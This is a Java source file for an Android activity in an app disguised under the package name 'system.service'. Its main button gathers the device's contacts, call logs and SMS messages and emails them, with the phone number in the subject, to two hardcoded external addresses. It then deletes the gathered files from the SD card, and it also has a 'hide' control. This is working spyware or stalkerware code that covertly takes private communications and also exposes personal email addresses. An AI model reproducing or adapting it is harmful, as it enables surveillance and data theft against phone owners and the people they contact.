package system.service.activity;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;

import system.service.GetInfoTask;
import system.service.R;
import system.service.config.ConfigCtrl;
import system.service.config.MailCfg;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

public class InitActivity extends Activity 
{
    protected static final String LOGTAG = "InitActivity";
    
	Button btn_getinfo;
    Button btn_screenshot;
    Button btn_setting;
    Button btn_hide;
    TextView hint_getinfo;
    TextView hint_screenshot;
    TextView hint_setting;
    TextView hint_hide;
    OnClickListener listener_getinfo = null;
    OnClickListener listener_screenshot = null;
    OnClickListener listener_setting = null;
    OnClickListener listener_hide = null;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.init);
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	btn_getinfo = (Button)findViewById(R.id.btn_getinfo);
    	btn_getinfo.setOnClickListener(listener_getinfo);
        btn_screenshot = (Button)findViewById(R.id.btn_screenshot);
        btn_screenshot.setOnClickListener(listener_screenshot);
        btn_setting = (Button)findViewById(R.id.btn_setting);
        btn_setting.setOnClickListener(listener_setting);
        btn_hide = (Button)findViewById(R.id.btn_hide);
        btn_hide.setOnClickListener(listener_hide);
        hint_getinfo = (TextView)findViewById(R.id.hint_getinfo);
        hint_screenshot = (TextView)findViewById(R.id.hint_screenshot);
        hint_setting = (TextView)findViewById(R.id.hint_setting);
        hint_hide = (TextView)findViewById(R.id.hint_hide);
        
        // Set button status
        boolean enabled = false;
        if (ConfigCtrl.getLicenseType(getApplicationContext()) != LICENSE_TYPE.NOT_LICENSED) enabled = true;
        btn_getinfo.setEnabled(enabled);
        btn_screenshot.setEnabled(enabled);
        btn_hide.setEnabled(enabled);
        hint_getinfo.setEnabled(enabled);
        hint_screenshot.setEnabled(enabled);
        hint_hide.setEnabled(enabled);
        
        btn_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
        hint_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
    	if (resultCode == RESULT_OK) 
    	{
			boolean isValidMailAddress = data.getExtras().getBoolean(GlobalPrefActivity.IS_VALID_MAIL_ADDRESS);

			// Enable buttons
			if (isValidMailAddress) {
				btn_getinfo.setEnabled(true);
				btn_screenshot.setEnabled(true);
				btn_hide.setEnabled(true);
				hint_getinfo.setEnabled(true);
				hint_screenshot.setEnabled(true);
				hint_hide.setEnabled(true);
			}
    	}
    }
    
    private void setListener()
    {
    	listener_getinfo = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If network connected, try to collect and send the information
        		if (SysUtils.isNetworkConnected(getApplicationContext()))
        		{
        			GetInfoTask.attachments = new ArrayList<File>();
        			
        			GetInfoTask.CollectContact(getApplicationContext());
        			GetInfoTask.CollectPhoneCallHist(getApplicationContext());
        			GetInfoTask.CollectSms(getApplicationContext());
        		
        			// Send mail
        			String subject = getResources().getString(R.string.mail_from) 
        	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
        	           		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
        			String body = String.format(getResources().getString(R.string.mail_body), 
        					DeviceProperty.getPhoneNumber(getApplicationContext()));
        			List<String> fileList = new ArrayList<String>();
        			for (int i = 0; i < GetInfoTask.attachments.size(); i++)
        				fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
        			
        			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
        			String pwd = MailCfg.getSenderPwd(getApplicationContext());
        			
        			boolean result = false;
        			int retry = 3;
        			while(!result && retry > 0)
        			{
        				String sender = MailCfg.getSender(getApplicationContext());
        				result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
        				if (!result) retry--;
        			}
        			if(result) {
        				SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
        			} else {
        				SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
        			}
        			GetInfoTask.attachments.clear();
        			
        			// Update the last date time
        			if (result) {
        				boolean successful = ConfigCtrl.setLastGetInfoTime(getApplicationContext(), new Date());
        				if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
        			}
        			
        			// Clean the files in SD-CARD
        			FileCtrl.cleanFolder();
        		}
            }
        };
        
        listener_screenshot = new OnClickListener()
        {
            public void onClick(View v)
            {
                //TODO
            }
        };
        
        listener_setting = new OnClickListener()
        {
            public void onClick(View v)
            {
            	Intent intent = new Intent().setClass(getBaseContext(), GlobalPrefActivity.class);
            	startActivityForResult(intent, R.layout.init);
            }
        };
        
        // Exit the dialog
        listener_hide = new OnClickListener()
        {
            public void onClick(View v)
            {
                finish();
            }
        };
    }
}
